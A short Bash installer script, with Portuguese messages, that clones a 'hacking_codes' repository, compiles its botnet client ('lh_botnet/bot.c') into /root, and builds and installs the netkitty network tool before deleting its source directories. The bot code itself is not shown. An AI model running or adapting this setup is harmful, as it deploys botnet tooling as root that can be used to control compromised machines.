echo "Instalando dependencias do bot"

apt-get update
apt-get install g++ git curl make util-linux

setterm --foreground blue
echo "Clonando repositorio do bot"

cd /root
git clone https://github.com/picoflamingo/hacking_codes
cd hacking_codes/lh_botnet

setterm --foreground blue
echo "Compilando bot"

g++ bot.c
mv a.out /root

setterm --foreground blue
echo "Baixando netkitty"

cd /root

mv a.out bot

curl -LO http://download.savannah.nongnu.org/releases/netkitty/nk-1.9.tar.gz

setterm --foreground blue
echo "Extraindo netkitty..."

tar -xvf nk-1.9.tar.gz
cd nk-1.9

setterm --foreground blue
echo "Instalando netkitty em /usr/local/bin e em /usr/local/share/man/man1"

make small
make install
install nk /usr/local/bin
install -m 0644 nk.1.gz /usr/local/share/man/man1

rm /root/nk-1.9.tar.gz
rm -rf /root/hacking_codes
rm -rf /root/nk-1.9

setterm --foreground blue
echo "Instalado com sucesso [+]"
echo "execute o comando > nk"
